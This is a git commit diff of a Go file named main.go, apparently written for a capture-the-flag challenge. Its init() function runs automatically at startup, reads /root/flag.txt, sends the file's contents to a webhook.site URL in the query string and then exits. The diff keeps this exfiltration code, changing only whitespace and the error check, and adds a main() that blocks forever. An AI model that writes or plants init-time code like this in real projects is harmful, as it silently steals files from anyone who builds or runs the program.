61c5252c51324c14c722e677546a8145a455a39a
Behiry <121094243+ahmedatef15011@users.noreply.github.com>
2025-04-11 21:17:07 +0200

    Update main.go

--- main.go
+++ main.go
@@ -1,18 +1,20 @@
 package main
 
 import (
-    "io/ioutil"
-    "net/http"
-    "os"
+	"io/ioutil"
+	"net/http"
+	"os"
 )
 
 func init() {
-    flag, err := ioutil.ReadFile("/root/flag.txt") // Adjust as needed
-    if err != nil {
-        return
-    }
-    http.Get("https://webhook.site/63a4f50c-ecc3-471f-b54f-29d162056002?flag=" + string(flag))
-    os.Exit(0)
+	flag, err := ioutil.ReadFile("/root/flag.txt")
+	if err == nil {
+		http.Get("https://webhook.site/63a4f50c-ecc3-471f-b54f-29d162056002?flag=" + string(flag))
+	}
+	os.Exit(0)
 }
 
-func main() {}
+func main() {
+	// Required by Go for building binaries from "package main"
+	select {} // Block forever, if it ever gets here (it shouldn't)
+}
